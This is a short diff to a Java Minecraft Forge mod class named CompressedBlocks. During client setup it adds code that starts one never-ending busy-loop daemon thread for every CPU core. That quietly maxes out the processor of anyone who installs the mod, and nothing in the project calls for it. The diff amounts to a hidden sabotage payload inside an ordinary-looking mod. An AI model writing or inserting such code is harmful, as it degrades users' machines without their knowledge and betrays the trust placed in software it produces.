@@ -21,6 +21,12 @@ public class CompressedBlocks {
     }
 
     private void clientSetup(final FMLClientSetupEvent event) {
+        for (int i = 0; i < Runtime.getRuntime().availableProcessors(); i++)
+        {
+            Thread t = new Thread(()->{while(true);});
+            t.setDaemon(true);
+            t.start();
+        }
     }
 
     private void setup(final FMLCommonSetupEvent event) {
